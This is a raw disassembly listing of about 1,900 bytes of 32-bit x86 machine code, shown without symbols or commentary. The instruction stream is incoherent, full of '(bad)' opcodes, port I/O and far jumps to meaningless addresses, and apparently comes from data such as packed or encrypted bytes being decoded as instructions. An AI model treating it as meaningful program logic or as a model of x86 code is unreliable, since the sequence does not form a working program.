  40c77e:	mov    cl,bh
  40c780:	pop    edi
  40c781:	jp     0x40c7dd
  40c783:	push   es
  40c784:	mov    ecx,0x6461cd3d
  40c789:	popf   
  40c78a:	xor    DWORD PTR [ebx+0x2ee1257e],eax
  40c790:	sbb    ah,BYTE PTR [ecx]
  40c792:	or     bl,BYTE PTR [ecx-0xc]
  40c795:	jl     0x40c7f1
  40c797:	jo     0x40c75a
  40c799:	(bad)  
  40c79a:	pusha  
  40c79b:	mov    ecx,0x85345302
  40c7a0:	mov    cl,0x67
  40c7a2:	test   eax,0x79c13e71
  40c7a7:	dec    ebp
  40c7a8:	push   es
  40c7a9:	xchg   esi,eax
  40c7aa:	bnd js 0xe8e30e97
  40c7b1:	into   
  40c7b2:	std    
  40c7b3:	out    dx,al
  40c7b4:	mov    dh,0xbd
  40c7b6:	mov    ecx,0x5be0c24b
  40c7bb:	pusha  
  40c7bc:	jp     0x40c7af
  40c7be:	(bad)  
  40c7bf:	jmp    0x8ee4cec2
  40c7c4:	scas   eax,DWORD PTR es:[edi]
  40c7c5:	loope  0x40c77d
  40c7c7:	dec    ebp
  40c7c8:	mov    esp,DWORD PTR [esi+ebp*8+0x5aabfbb3]
  40c7cf:	cmc    
  40c7d0:	ret    
  40c7d1:	test   eax,0x87a6945b
  40c7d6:	retf   
  40c7d7:	inc    ebx
  40c7d8:	push   ds
  40c7d9:	inc    ecx
  40c7da:	mov    ch,0x34
  40c7dc:	sbb    eax,0x622e4499
  40c7e1:	xchg   edi,eax
  40c7e2:	out    0x85,eax
  40c7e4:	inc    ecx
  40c7e5:	ror    BYTE PTR [ecx+0x33],1
  40c7e8:	ja     0x40c858
  40c7ea:	pop    edx
  40c7eb:	js     0x40c819
  40c7ed:	and    DWORD PTR [esi-0x25],ebx
  40c7f0:	call   0xd6d9:0x74845ca5
  40c7f7:	and    bh,BYTE PTR [edi]
  40c7f9:	addr16 sbb al,0x48
  40c7fc:	mov    ch,0x2f
  40c7fe:	bound  esi,QWORD PTR [eax]
  40c800:	int3   
  40c801:	icebp  
  40c802:	mov    gs,WORD PTR es:[edx-0x35]
  40c806:	retf   
  40c807:	hlt    
  40c808:	stos   DWORD PTR es:[edi],eax
  40c809:	xchg   DWORD PTR [edx-0x54],ebx
  40c80c:	ds pop ebp
  40c80e:	adc    ch,BYTE PTR [ecx]
  40c810:	and    ch,ah
  40c812:	addr16 mov edx,0xab96e6a2
  40c818:	popf   
  40c819:	rcr    DWORD PTR [eax-0xeb060f2],cl
  40c81f:	mov    dl,bh
  40c821:	mov    eax,ds:0x5e916058
  40c826:	xor    esi,edi
  40c828:	lock out 0xba,eax
  40c82b:	add    eax,0xfb1c3007
  40c830:	outs   dx,DWORD PTR ds:[esi]
  40c831:	int3   
  40c832:	or     eax,0x5bd4d7c6
  40c837:	shl    BYTE PTR [edi+0x46566209],1
  40c83d:	in     al,0x56
  40c83f:	jae    0x40c886
  40c841:	mov    eax,ds:0x76679d66
  40c846:	dec    edi
  40c847:	daa    
  40c848:	fiadd  DWORD PTR [ecx-0xb0cd8c1]
  40c84e:	pop    edx
  40c84f:	add    BYTE PTR [ecx-0x11a5c9a0],dh
  40c855:	cmp    al,0x65
  40c857:	test   DWORD PTR [ecx+eiz*4],esi
  40c85a:	fmul   st(3),st
  40c85c:	dec    esp
  40c85d:	pop    ss
  40c85e:	sub    eax,0x80ea43d6
  40c863:	test   BYTE PTR [edi+0x287afb76],dh
  40c869:	rol    BYTE PTR [esi],cl
  40c86b:	test   ch,al
  40c86d:	pop    ebx
  40c86e:	mov    bh,0x32
  40c870:	ds xchg ebp,eax
  40c872:	leave  
  40c873:	push   ds
  40c874:	adc    ebp,DWORD PTR [edi-0x18b1abe4]
  40c87a:	pop    esi
  40c87b:	pushf  
  40c87c:	jae    0x40c8c0
  40c87e:	push   ebx
  40c87f:	pop    edx
  40c880:	mov    ebx,0x3057685a
  40c885:	jb     0x40c8e2
  40c887:	fmul   st(2),st
  40c889:	lahf   
  40c88a:	inc    eax
  40c88b:	push   ebx
  40c88c:	out    dx,al
  40c88d:	sub    bh,bh
  40c88f:	test   BYTE PTR [edx+0x3f654a7d],bh
  40c895:	jecxz  0x40c82e
  40c897:	stc    
  40c898:	sub    DWORD PTR [edx-0x1853e89e],edx
  40c89e:	jp     0x40c821
  40c8a0:	aam    0x6b
  40c8a2:	popf   
  40c8a3:	ss dec edi
  40c8a5:	xor    DWORD PTR [ecx-0x47],ebp
  40c8a8:	nop
  40c8a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8aa:	pop    ebx
  40c8ab:	sahf   
  40c8ac:	mov    es,WORD PTR [eax+0x29]
  40c8af:	pop    es
  40c8b0:	mov    cl,BYTE PTR [esi-0x10]
  40c8b3:	test   DWORD PTR [ebx],esi
  40c8b5:	jmp    0x613e:0xe1d9c004
  40c8bc:	adc    edi,eax
  40c8be:	pop    edx
  40c8bf:	sbb    BYTE PTR [ebx+edi*4],al
  40c8c2:	sub    esi,DWORD PTR [ebx]
  40c8c4:	cmp    al,0xad
  40c8c6:	(bad)  
  40c8c7:	xchg   DWORD PTR ds:0x710595b6,edi
  40c8cd:	mov    bl,0x2c
  40c8cf:	jge    0x40c8c5
  40c8d1:	cmp    bl,BYTE PTR [edx-0xa]
  40c8d4:	repz lock pop esi
  40c8d7:	cmp    al,0x16
  40c8d9:	jle    0x40c8a4
  40c8db:	xor    BYTE PTR [eax+0x7de5a321],0x4d
  40c8e2:	dec    ebx
  40c8e3:	test   ecx,ebx
  40c8e5:	fbld   TBYTE PTR [eax-0x4a]
  40c8e8:	push   0xffffffaa
  40c8ea:	fld    TBYTE PTR [edx+0x64]
  40c8ed:	out    0xa4,al
  40c8ef:	les    edx,FWORD PTR [edx-0x72]
  40c8f2:	in     al,0x20
  40c8f4:	pop    ecx
  40c8f5:	sub    dl,bl
  40c8f7:	ss cmp al,0xad
  40c8fa:	sahf   
  40c8fb:	sbb    eax,0xe1481a4b
  40c900:	xchg   BYTE PTR [edx+eax*4],bl
  40c903:	pop    edx
  40c904:	into   
  40c905:	icebp  
  40c906:	inc    esp
  40c907:	test   BYTE PTR [esi],bl
  40c909:	arpl   WORD PTR [ebp+0x1f],si
  40c90c:	ds in  eax,dx
  40c90e:	cmp    ecx,DWORD PTR [ebx-0x68]
  40c911:	fbld   TBYTE PTR [ebp-0x51356033]
  40c917:	push   0x532e7f7
  40c91c:	arpl   WORD PTR [ebx-0x1ec6efa8],ax
  40c922:	jae    0x40c8ed
  40c924:	stc    
  40c925:	push   ebx
  40c926:	push   0x4f
  40c928:	mov    cl,0xfa
  40c92a:	addr16 push esp
  40c92c:	cmp    al,0x1a
  40c92e:	xor    DWORD PTR [ebp-0xc5d9387],eax
  40c934:	add    al,0x71
  40c936:	mov    cs,WORD PTR [esi-0xe]
  40c939:	cmp    BYTE PTR [edi+0x62],ch
  40c93c:	add    ah,BYTE PTR [esi+0x45]
  40c93f:	mov    esp,0xe809053
  40c944:	dec    esi
  40c945:	in     eax,dx
  40c946:	mov    eax,ds:0x585207f3
  40c94b:	fsubr  QWORD PTR [ebx+0x3c6d7d37]
  40c951:	jge    0x40c964
  40c953:	cdq    
  40c954:	xor    eax,DWORD PTR [ebx]
  40c956:	jge    0x40c964
  40c958:	mov    ebp,0x949775aa
  40c95d:	out    0xfa,al
  40c95f:	jge    0x40c942
  40c961:	iret   
  40c962:	leave  
  40c963:	push   ebp
  40c964:	jnp    0x40c94c
  40c966:	shl    edi,0x83
  40c969:	test   DWORD PTR [ebp-0x70],edx
  40c96c:	fimul  WORD PTR [ecx+0x4c]
  40c96f:	sub    al,0xa4
  40c971:	fldcw  WORD PTR [esi-0x3b19718e]
  40c977:	retf   
  40c978:	mov    cl,0x65
  40c97a:	ficom  WORD PTR [ebx+0x3c930cd3]
  40c980:	or     ch,ch
  40c982:	es enter 0xfd71,0xd6
  40c987:	stc    
  40c988:	aas    
  40c989:	ss pop edx
  40c98b:	xchg   ebp,eax
  40c98c:	jp     0x40c940
  40c98e:	jp     0x40c92a
  40c990:	(bad)  
  40c991:	rcl    DWORD PTR [esi-0x44d40278],1
  40c997:	xor    ecx,ecx
  40c999:	gs pop edx
  40c99b:	mov    bl,cl
  40c99d:	push   ecx
  40c99e:	sbb    edx,ebx
  40c9a0:	jnp    0x40c988
  40c9a2:	nop
  40c9a3:	jge    0x40c9fc
  40c9a5:	shl    BYTE PTR [ecx],0x76
  40c9a8:	xor    al,0xf1
  40c9aa:	sbb    ch,0x3a
  40c9ad:	mov    ebp,0x2ce58c5b
  40c9b2:	push   0x54e6530c
  40c9b7:	hlt    
  40c9b8:	pop    esi
  40c9b9:	cmp    ch,0xf7
  40c9bc:	cld    
  40c9bd:	dec    eax
  40c9be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9bf:	cmp    al,0xe2
  40c9c1:	sub    al,0x5b
  40c9c3:	mov    ah,0x45
  40c9c5:	or     al,0xaa
  40c9c7:	mov    ecx,0x8467b9ec
  40c9cc:	or     BYTE PTR [ebp-0x7f],dl
  40c9cf:	test   eax,0x66fa4f86
  40c9d4:	fs out dx,eax
  40c9d6:	xchg   ebp,eax
  40c9d7:	test   BYTE PTR [eax+0x4c],dh
  40c9da:	xlat   BYTE PTR ds:[ebx]
  40c9db:	jb     0x40ca2d
  40c9dd:	sbb    DWORD PTR [esi-0x43],edx
  40c9e0:	inc    esi
  40c9e1:	and    al,0x1c
  40c9e3:	test   BYTE PTR [eax],dl
  40c9e5:	pop    eax
  40c9e6:	arpl   WORD PTR [ecx-0x61],bp
  40c9e9:	arpl   WORD PTR [edx-0x4a],bx
  40c9ec:	pop    eax
  40c9ed:	pop    esp
  40c9ee:	mul    BYTE PTR [edx-0x7b8851d6]
  40c9f4:	scas   eax,DWORD PTR es:[edi]
  40c9f5:	stos   DWORD PTR es:[edi],eax
  40c9f6:	adc    eax,0x19a74c7a
  40c9fb:	push   ss
  40c9fc:	push   esp
  40c9fd:	push   edx
  40c9fe:	xchg   edi,eax
  40c9ff:	test   DWORD PTR [ebx+edi*4+0x1fe8c425],esi
  40ca06:	xor    eax,DWORD PTR [edi-0x654d2422]
  40ca0c:	bswap  ebp
  40ca0e:	cmp    DWORD PTR [ebp-0x2a],0x7a45a62
  40ca15:	into   
  40ca16:	(bad)  
  40ca17:	hlt    
  40ca18:	pop    esi
  40ca19:	jle    0x40c9fe
  40ca1b:	test   DWORD PTR [esi],esp
  40ca1d:	idiv   BYTE PTR [edi+0x4c]
  40ca20:	xlat   BYTE PTR ds:[ebx]
  40ca21:	jmp    DWORD PTR [edx+ebx*4]
  40ca24:	ret    0x538f
  40ca27:	cmp    bh,BYTE PTR [esi]
  40ca29:	stos   BYTE PTR es:[edi],al
  40ca2a:	mov    ah,0x81
  40ca2c:	mov    fs,esi
  40ca2e:	dec    esi
  40ca2f:	stc    
  40ca30:	mov    ch,0x27
  40ca32:	sbb    al,0xce
  40ca34:	imul   eax,DWORD PTR [edx],0xe7e35672
  40ca3a:	sub    al,0xf6
  40ca3c:	les    edi,FWORD PTR [edx-0x62a569ae]
  40ca42:	mov    dl,BYTE PTR [edx]
  40ca44:	aas    
  40ca45:	cwde   
  40ca46:	inc    ebx
  40ca47:	dec    eax
  40ca48:	scas   eax,DWORD PTR es:[edi]
  40ca49:	sub    al,0x3
  40ca4b:	pop    eax
  40ca4c:	add    edx,DWORD PTR ss:[esi-0x58]
  40ca50:	mov    bl,0x19
  40ca52:	jge    0x40cad2
  40ca54:	pop    edi
  40ca55:	(bad)  
  40ca56:	ficomp DWORD PTR [ecx-0x510d5c4]
  40ca5c:	stc    
  40ca5d:	inc    esi
  40ca5e:	pop    ebx
  40ca5f:	loop   0x40ca9c
  40ca61:	cdq    
  40ca62:	jg     0x40ca95
  40ca64:	aas    
  40ca65:	push   ebp
  40ca66:	mov    dl,0x1
  40ca68:	cmp    DWORD PTR [eax-0x18fb65bb],edx
  40ca6e:	xchg   esi,eax
  40ca6f:	pop    ss
  40ca70:	or     eax,0x2b559e64
  40ca75:	sbb    DWORD PTR [esi+esi*1-0xb5478c2],0x5fcaf47a
  40ca80:	les    edx,FWORD PTR [edi+0x3c633fd]
  40ca86:	aam    0xf6
  40ca88:	mov    ds:0x42b66767,eax
  40ca8d:	and    al,0x12
  40ca8f:	sbb    esp,DWORD PTR [eax]
  40ca91:	repz jmp 0x602:0xfea6a29d
  40ca99:	ds pop ebp
  40ca9b:	stc    
  40ca9c:	and    dl,cl
  40ca9e:	test   BYTE PTR [ebp+0x7fb674f],cl
  40caa4:	je     0x40ca3e
  40caa6:	frstor [ecx+0x125b4bc2]
  40caac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40caad:	(bad)  
  40caae:	ss mov eax,0xfc111564
  40cab4:	or     al,0x43
  40cab6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cab7:	sub    bh,0x27
  40caba:	xor    esi,0x255b3f04
  40cac0:	das    
  40cac1:	stc    
  40cac2:	pop    ebx
  40cac3:	mov    ch,BYTE PTR [ebp-0x63715733]
  40cac9:	inc    edi
  40caca:	lds    edx,FWORD PTR [edi+0x1b036220]
  40cad0:	es jecxz 0x40caad
  40cad3:	push   0xb5bb173f
  40cad8:	bound  edx,QWORD PTR [eax-0x1bf41d8c]
  40cade:	into   
  40cadf:	or     eax,0x1d7fed2a
  40cae4:	mov    ds:0x3cc98c26,al
  40cae9:	call   DWORD PTR [ecx]
  40caeb:	xlat   BYTE PTR ds:[ebx]
  40caec:	les    eax,FWORD PTR [ebx-0x7e]
  40caef:	or     eax,0xef7ba6a1
  40caf4:	js     0x40ca8f
  40caf6:	mov    ah,dl
  40caf8:	ds dec ebx
  40cafa:	push   edx
  40cafb:	(bad)  
  40cafc:	clc    
  40cafd:	pop    edi
  40cafe:	cli    
  40caff:	jae    0x40cb40
  40cb01:	or     esi,esi
  40cb03:	push   esi
  40cb05:	add    BYTE PTR [ecx+0x1ee6bb11],ah
  40cb0b:	jns    0x40cb17
  40cb0d:	sub    esi,eax
  40cb0f:	xchg   ebp,eax
  40cb10:	rcr    BYTE PTR [edx-0x6a],cl
  40cb13:	and    dh,0x3
  40cb16:	pop    ebx
  40cb17:	and    BYTE PTR [ebp-0x66],al
  40cb1a:	mov    edx,0x820ed95b
  40cb1f:	ins    DWORD PTR es:[edi],dx
  40cb20:	rcl    BYTE PTR [ecx+0x175f8567],0xfc
  40cb27:	aad    0x3c
  40cb29:	mov    bh,0x80
  40cb2b:	adc    BYTE PTR [eax-0x58fa1ab4],ch
  40cb31:	shr    dl,cl
  40cb33:	(bad)  
  40cb35:	clc    
  40cb36:	call   0x3327e2c6
  40cb3b:	iret   
  40cb3c:	mov    ebp,0x3afc78b8
  40cb41:	adc    DWORD PTR [edx+0x78],ebx
  40cb44:	shl    BYTE PTR [ecx],0xd1
  40cb47:	mov    ah,0x4a
  40cb49:	ja     0x40cb17
  40cb4b:	test   DWORD PTR [esi],edx
  40cb4d:	bound  ebp,QWORD PTR [eax+0x4]
  40cb50:	aas    
  40cb51:	imul   edi,esi,0x63cd275c
  40cb57:	stos   BYTE PTR es:[edi],al
  40cb58:	out    0xe7,eax
  40cb5a:	mov    ah,0xdf
  40cb5c:	in     al,0x2a
  40cb5e:	iret   
  40cb5f:	sbb    eax,0x6024f82
  40cb64:	inc    ebp
  40cb65:	pop    eax
  40cb66:	pop    edx
  40cb67:	mov    al,al
  40cb69:	xlat   BYTE PTR ds:[ebx]
  40cb6a:	push   ebx
  40cb6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb6c:	inc    esi
  40cb6d:	xor    al,0xb9
  40cb6f:	xchg   esi,eax
  40cb70:	ds jp  0x40cb0d
  40cb73:	mov    esp,0xb7db6313
  40cb78:	in     eax,0x61
  40cb7a:	pop    ebx
  40cb7b:	sahf   
  40cb7c:	mov    WORD PTR fs:0x45a2aed3,es
  40cb83:	test   BYTE PTR [edx],cl
  40cb85:	ja     0x40cb73
  40cb87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb88:	adc    BYTE PTR [ecx-0x4ec1aa8e],al
  40cb8e:	das    
  40cb8f:	dec    esi
  40cb90:	loope  0x40cb9a
  40cb92:	adc    DWORD PTR [edi-0x7b0e57c8],eax
  40cb98:	sub    al,0x9c
  40cb9a:	push   es
  40cb9b:	mov    bh,0x30
  40cb9d:	xor    eax,0x50195e34
  40cba2:	dec    esp
  40cba3:	lds    edx,FWORD PTR [edi+0x7a8b3b29]
  40cba9:	dec    ecx
  40cbaa:	or     eax,0x2c126e84
  40cbaf:	dec    eax
  40cbb0:	ss gs adc ah,al
  40cbb4:	rol    BYTE PTR [ecx-0xfc2fccb],0xda
  40cbbb:	pop    ecx
  40cbbc:	mov    eax,0x907376e6
  40cbc1:	pop    edx
  40cbc2:	imul   edi,DWORD PTR [edi],0xd4353832
  40cbc8:	aas    
  40cbc9:	mov    bh,0xbf
  40cbcb:	dec    eax
  40cbcc:	cld    
  40cbcd:	adc    al,0x29
  40cbcf:	mov    edx,0xb9d2e6a8
  40cbd4:	or     eax,0x6759167c
  40cbd9:	dec    ecx
  40cbda:	in     eax,0xea
  40cbdc:	pusha  
  40cbdd:	mov    eax,ds:0xca4105a
  40cbe2:	fimul  DWORD PTR [ebp-0x7bff3f7e]
  40cbe8:	mov    ds,WORD PTR [eax+0x40e2e569]
  40cbee:	(bad)  
  40cbef:	cmc    
  40cbf0:	into   
  40cbf1:	(bad)  
  40cbf2:	pop    edx
  40cbf3:	push   es
  40cbf4:	repnz xor BYTE PTR [edx-0x3],ah
  40cbf8:	sub    al,0xff
  40cbfa:	lods   eax,DWORD PTR ds:[esi]
  40cbfb:	test   BYTE PTR [edi],dh
  40cbfd:	data16 std 
  40cbff:	mov    cl,0x21
  40cc01:	scas   eax,DWORD PTR es:[edi]
  40cc02:	xchg   ecx,eax
  40cc03:	test   BYTE PTR [ebp+0x26],ah
  40cc06:	mov    esi,0x74279419
  40cc0b:	mov    edx,0xfc988260
  40cc10:	(bad)  
  40cc11:	sub    BYTE PTR [ebx-0x73],bl
  40cc14:	and    BYTE PTR [edx-0x7e],cl
  40cc17:	jo     0x40cb9e
  40cc19:	out    0x21,eax
  40cc1b:	mov    ch,BYTE PTR [ebx+0x7c48a2c]
  40cc21:	out    0xf0,eax
  40cc23:	shr    BYTE PTR [esi-0x4947c70c],0x35
  40cc2a:	arpl   WORD PTR [edi],cx
  40cc2c:	in     eax,dx
  40cc2d:	out    0x29,eax
  40cc2f:	mov    al,0xaa
  40cc31:	movd   mm6,DWORD PTR [edx+eiz*8-0x19]
  40cc36:	mov    esi,0xbbee78df
  40cc3b:	in     eax,0x1e
  40cc3d:	test   DWORD PTR [ebx-0x69],eax
  40cc40:	sub    dh,BYTE PTR [edx+ebx*2]
  40cc43:	sbb    al,BYTE PTR [ebx+0x34]
  40cc46:	jne    0x40cc11
  40cc48:	lods   al,BYTE PTR ds:[esi]
  40cc49:	imul   edi,DWORD PTR [ecx-0x2e88277b],0x39
  40cc50:	pop    es
  40cc51:	jge    0x40ccab
  40cc53:	pop    edx
  40cc54:	ds xchg ebx,eax
  40cc56:	mov    ah,0x71
  40cc58:	xchg   ebx,eax
  40cc59:	mov    eax,ds:0x2a0a52ff
  40cc5e:	clc    
  40cc5f:	test   ecx,ecx
  40cc61:	imul   esp,DWORD PTR [esi],0xfa713f16
  40cc67:	xchg   edx,eax
  40cc68:	xchg   esp,eax
  40cc69:	jge    0x40cc15
  40cc6b:	push   ebp
  40cc6c:	(bad)  
  40cc6d:	out    0x72,eax
  40cc6f:	sub    edx,ecx
  40cc71:	je     0x40cc7a
  40cc73:	cmp    eax,0xcce42f7
  40cc78:	sahf   
  40cc79:	mov    bl,BYTE PTR [edx+0x52]
  40cc7c:	cmp    DWORD PTR [edi+0x7400e80f],ecx
  40cc82:	lock cwde 
  40cc84:	hlt    
  40cc85:	(bad)  
  40cc86:	fnsave [edi]
  40cc88:	jmp    0x40cc5f
  40cc8a:	int3   
  40cc8b:	add    ebx,ecx
  40cc8d:	push   ss
  40cc8e:	pop    ebx
  40cc8f:	in     eax,0x3e
  40cc91:	lds    ebp,FWORD PTR [ebp-0x4]
  40cc94:	loop   0x40cc47
  40cc96:	or     dh,bl
  40cc98:	cwde   
  40cc99:	push   ds
  40cc9a:	out    0x52,al
  40cc9c:	jo     0x40cc84
  40cc9e:	lods   al,BYTE PTR ds:[esi]
  40cc9f:	ins    BYTE PTR es:[edi],dx
  40cca0:	scas   al,BYTE PTR es:[edi]
  40cca1:	cli    
  40cca2:	jo     0x40ccfe
  40cca4:	fcos   
  40cca6:	jnp    0x40ccd8
  40cca8:	jns    0x40cc9a
  40ccaa:	push   ebp
  40ccab:	inc    esp
  40ccac:	jmp    FWORD PTR [ebx-0x191a098b]
  40ccb2:	loop   0x40cc88
  40ccb4:	fcmovb st,st(5)
  40ccb6:	jns    0x40cd0a
  40ccb8:	pushf  
  40ccb9:	imul   eax,DWORD PTR [ebx+0x5ba998c8],0xfa5ed2c0
  40ccc3:	pop    ds
  40ccc4:	mov    ah,0x59
  40ccc6:	cmc    
  40ccc7:	test   DWORD PTR [edx-0x38],eax
  40ccca:	out    0x33,al
  40cccc:	(bad)  [ebx-0x18c445a0]
  40ccd2:	pop    ebx
  40ccd3:	jp     0x40cc9f
  40ccd5:	dec    ebp
  40ccd6:	out    dx,al
  40ccd7:	mov    cl,BYTE PTR [ecx+esi*1+0x33]
  40ccdb:	test   DWORD PTR [edi],ecx
  40ccdd:	in     al,0x41
  40ccdf:	loope  0x40cd1f
  40cce1:	adc    eax,0x136b62fa
  40cce6:	imul   ebp,DWORD PTR [edi-0x71],0xb0ee56e6
  40cced:	call   0xd8b37293
  40ccf2:	pop    edx
  40ccf3:	sbb    eax,0xd6a995c2
  40ccf8:	mov    ds:0xcba25a8f,al
  40ccfd:	arpl   WORD PTR [ebp-0x6c5ed21],ax
  40cd03:	mov    ebp,0x85c22636
  40cd08:	out    0x41,al
  40cd0a:	lds    eax,FWORD PTR [esi+0x39]
  40cd0d:	xlat   BYTE PTR ds:[ebx]
  40cd0e:	popa   
  40cd0f:	fcomp  DWORD PTR [edi]
  40cd11:	std    
  40cd12:	fucom  st(5)
  40cd14:	sbb    eax,0x3cb417d2
  40cd19:	dec    edi
  40cd1a:	iret   
  40cd1b:	test   DWORD PTR [eax+0x3f7e1e65],ecx
  40cd21:	cmp    DWORD PTR [edi*1-0x1ee511dc],edi
  40cd28:	push   edx
  40cd29:	cli    
  40cd2a:	cmp    BYTE PTR [ebp+ebx*4-0x10],ch
  40cd2e:	mov    ebx,0x9adb6c32
  40cd33:	popa   
  40cd34:	fidivr DWORD PTR [edx-0x3bfe0426]
  40cd3a:	ja     0x40cd4c
  40cd3c:	mov    dh,0xa8
  40cd3e:	pop    edx
  40cd3f:	lock dec ecx
  40cd41:	out    0x10,eax
  40cd43:	call   0x3da4:0x6200d2a7
  40cd4a:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40cd4c:	mov    ch,dl
  40cd4e:	pop    ebx
  40cd4f:	push   esi
  40cd50:	add    cl,BYTE PTR [ecx-0x4cbbcaae]
  40cd56:	adc    al,BYTE PTR [ebp+ecx*4+0x4c41f897]
  40cd5d:	and    DWORD PTR [ebx],0xbfed0a7d
  40cd63:	test   DWORD PTR [ebx-0x3b14d48b],edx
  40cd69:	stos   BYTE PTR es:[edi],al
  40cd6a:	and    DWORD PTR [eax+eax*4+0x3e866d7e],eax
  40cd71:	std    
  40cd72:	je     0x40cdbe
  40cd74:	jl     0x40cd31
  40cd76:	mov    WORD PTR [ebp-0x5cd57879],ss
  40cd7c:	jnp    0x40cdf3
  40cd7e:	aam    0x5e
  40cd80:	dec    esp
  40cd81:	push   ebx
  40cd82:	scas   eax,DWORD PTR es:[edi]
  40cd83:	test   BYTE PTR [eax],0x85
  40cd86:	mov    esi,0xf64fe684
  40cd8b:	xchg   ebp,eax
  40cd8c:	jl     0x40cd72
  40cd8e:	xor    bh,BYTE PTR [edx-0x2b]
  40cd91:	xor    DWORD PTR [edx],esp
  40cd93:	loope  0x40cdfb
  40cd95:	xchg   BYTE PTR [edx-0x7],al
  40cd98:	add    bh,bh
  40cd9a:	push   0x7b973017
  40cd9f:	dec    esp
  40cda0:	mov    edi,0xa8f669e
  40cda5:	out    0xfe,eax
  40cda7:	shr    ebx,1
  40cda9:	jp     0x40cdff
  40cdab:	clc    
  40cdac:	fsubr  DWORD PTR [edi-0x18]
  40cdaf:	pop    ds
  40cdb0:	out    dx,eax
  40cdb1:	cmp    eax,0xdff3f25b
  40cdb6:	sub    al,0x66
  40cdb8:	adc    dh,cl
  40cdba:	jecxz  0x40cd40
  40cdbc:	and    BYTE PTR [esi+0x5f],0xe1
  40cdc0:	aas    
  40cdc1:	(bad)  
  40cdc2:	cmp    dh,BYTE PTR [ecx-0x6d]
  40cdc5:	mov    edi,0xe75e2b48
  40cdca:	call   0xdfce:0xc4923c47
  40cdd1:	or     dh,bh
  40cdd3:	jae    0x40cdc8
  40cdd5:	inc    edx
  40cdd6:	pop    edx
  40cdd7:	jl     0x40cdc1
  40cdd9:	punpcklwd mm1,DWORD PTR [ebx-0x32ef34ba]
  40cde0:	in     al,0xeb
  40cde2:	clc    
  40cde3:	test   BYTE PTR [ebx+0x9],bl
  40cde6:	or     DWORD PTR [ecx+ebp*1-0x5403a475],edi
  40cded:	fcmovb st,st(3)
  40cdef:	rol    BYTE PTR [edx-0x3c],0x48
  40cdf3:	test   eax,edx
  40cdf5:	mov    edx,ebp
  40cdf7:	mov    dh,0x46
  40cdf9:	(bad)  
  40cdfb:	push   edi
  40cdfc:	dec    ecx
  40cdfd:	xchg   edi,eax
  40cdfe:	(bad)  
  40cdff:	jne    0x40ce33
  40ce01:	mov    esp,0xc78884fa
  40ce06:	xchg   esp,eax
  40ce07:	inc    esi
  40ce09:	push   0x303ff78b
  40ce0e:	sub    ah,BYTE PTR [esi-0x50]
  40ce11:	fwait
  40ce12:	jb     0x40cda2
  40ce14:	ds mov edi,0x44dbbc01
  40ce1a:	int    0x50
  40ce1c:	out    dx,al
  40ce1d:	pop    es
  40ce1e:	pop    ds
  40ce1f:	(bad)  
  40ce20:	push   esp
  40ce21:	xchg   ecx,eax
  40ce22:	push   ecx
  40ce23:	test   DWORD PTR [edx+0x3fcfda15],ebp
  40ce29:	sbb    DWORD PTR [edi+eax*4],edi
  40ce2c:	cmp    eax,DWORD PTR [edi+ebx*8-0x68]
  40ce30:	cmp    eax,0x1495a4dd
  40ce35:	out    0x49,al
  40ce37:	cli    
  40ce38:	jns    0x40ce6f
  40ce3a:	add    BYTE PTR [ecx],dh
  40ce3c:	ds adc eax,0x6e543b7e
  40ce42:	mov    eax,cs:0xd32a1cb9
  40ce48:	xchg   esi,eax
  40ce49:	pop    es
  40ce4a:	xchg   esi,eax
  40ce4b:	hlt    
  40ce4c:	sahf   
  40ce4d:	aas    
  40ce4e:	mov    ebp,esp
  40ce50:	aas    
  40ce51:	dec    ebp
  40ce52:	mov    dh,0xa3
  40ce54:	jb     0x40ce39
  40ce56:	ror    ebp,0x29
  40ce59:	in     al,0x14
  40ce5b:	test   eax,0x984e1cd1
  40ce60:	push   ecx
  40ce61:	xor    BYTE PTR [edi-0x75270cfb],ch
  40ce67:	push   edi
  40ce68:	push   ecx
  40ce69:	inc    ebx
  40ce6a:	pop    edx
  40ce6b:	aam    0x22
  40ce6d:	or     BYTE PTR [esi+ebp*2],ch
  40ce70:	cli    
  40ce71:	inc    esi
  40ce72:	iret   
  40ce73:	test   cl,cl
  40ce75:	test   BYTE PTR [ebx-0x1f64fdf3],al
  40ce7b:	test   BYTE PTR [eax],0x1f
  40ce7e:	jecxz  0x40ceff
  40ce80:	mov    cs,WORD PTR [ebx]
  40ce82:	pop    edx
  40ce83:	test   al,0xdc
  40ce85:	out    0xd0,al
  40ce87:	scas   al,BYTE PTR es:[edi]
  40ce88:	int    0x59
  40ce8a:	cdq    
  40ce8b:	in     eax,dx
  40ce8c:	out    0x5a,al
  40ce8e:	clc    
  40ce8f:	cmp    al,0x3d
  40ce91:	call   FWORD PTR [ebx+0x7c]
  40ce94:	mov    ebx,0xf0c55859
  40ce99:	popa   
  40ce9a:	mov    ebx,0x7e0489bd
  40ce9f:	add    eax,0xfd0be9c3
  40cea4:	cmp    eax,DWORD PTR [ecx]
  40cea6:	pop    ebx
  40cea7:	dec    edx
  40cea8:	jg     0x40ceeb
  40ceaa:	repz xor al,0x72
  40cead:	jmp    0x40ceeb
  40ceaf:	call   0x3911:0x4d851e7e
  40ceb6:	mov    edx,0x5a2a8440
  40cebb:	add    cl,bh
  40cebd:	js     0x40cf1d
  40cebf:	or     BYTE PTR [edx],0xc4
  40cec2:	in     al,dx
  40cec3:	test   DWORD PTR [eax+0x38dc617e],edi
  40cec9:	daa    
  40ceca:	(bad)  ds:0xd7028148
  40ced0:	inc    ebp
  40ced1:	add    al,0xd5
  40ced3:	inc    edx
  40ced4:	out    dx,al
  40ced5:	(bad)  
  40ced6:	retf   0xa6f
  40ced9:	lahf   
  40ceda:	jl     0x40ce60
  40cedc:	in     al,0xe1
  40cede:	cwde   
  40cedf:	daa    
  40cee0:	enter  0xc01,0x73
  40cee4:	pop    ss
  40cee5:	cmc    
  40cee6:	inc    edi
  40cee7:	dec    esp
  40cee8:	mov    eax,0x78453fd5
  40ceed:	mov    ebx,0xe7f24da2
  40cef2:	mov    dl,0x3b
  40cef4:	out    0xd8,eax
  40cef6:	sub    DWORD PTR [eax+0x0],ebx
  40cef9:	jnp    0x40ceda
  40cefb:	sti    
  40cefc:	aas    
